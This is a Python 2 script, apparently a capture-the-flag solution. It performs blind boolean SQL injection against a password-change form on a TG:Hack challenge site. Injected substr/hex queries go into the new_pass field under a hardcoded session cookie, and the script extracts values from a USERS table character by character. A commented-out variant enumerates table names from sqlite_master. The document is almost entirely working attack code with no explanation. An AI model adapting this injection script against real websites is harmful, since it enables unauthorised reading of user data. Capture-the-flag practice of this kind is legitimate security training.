import requests
import os
url = 'https://bobby.tghack.no/password'
flags = ''
char = ''
if os.path.isfile('bk') != False:
    f = open('bk', 'r')
    flags = f.read().replace('\n','')
    f.close()
id = '5ea03e61x642c18908d5115f58511837bc6ff182da8cf9b81e02f96c24224dda39c3fa0fc3fc44c74ae7d893c34de6a54e0429d013552bd43fb379e91fe648a3e36e8e337x74df5ce314f5b6e8200679556e55d7e1f1aba26b9cf877dda38dd459bf3adf3d'
print 'init flag : ' + flags
cookies = {'id': id}
name_table = 'USERS'
while True:
    i = 0
    char = ''
    flag_find = 0
    while i < 32:
        ch = hex(i%16)[2:]
        print 'ch: ' + ch
        #sql_getTable = "1' where ?=? and substr(hex(substr((select tbl_name from sqlite_master limit 0, 1),{0},1)),{1},1)='{2}'".format(len(flags)+1, (i/16)+1, ch)
        sql_getColumn = "1' where ?=? and substr(hex(substr((select user from {0} limit 0, 1),{1},1)),{2},1)='{3}'".format(name_table, len(flags)+1, (i/16)+1, ch)
        payload = sql_getColumn + ' -- '
        print 'payload : ' + payload
        data = {'user': '', 'old_pass' : '', 'new_pass' : payload}
        res = requests.post(url, data=data, cookies = cookies)
        if res.text.find('challenge') != -1:
            print 'ohno !!! session closed!!'
            f = open('bk', 'w')
            f.write(flags)
            f.close()
            exit(0)

        print res.text.split('<div class="line"><div class="right">')[1].split('</div>')[0]
        if res.text.find('changed') != -1 :
            char += ch
            if i/16 == 1:
                flags += chr(int(char, 16))
                print 'flags: ' + flags
            print 'Found!! ' 
            print 'char: ' + char
            i = (i/16)*16 + 16
            print 'i: ' + str(i)
            flag_find = 1
            continue
        i += 1
        print '#####################################'
    if flag_find == 0:
        break

print '\n\n\n\n'
print 'flags : ' + flags
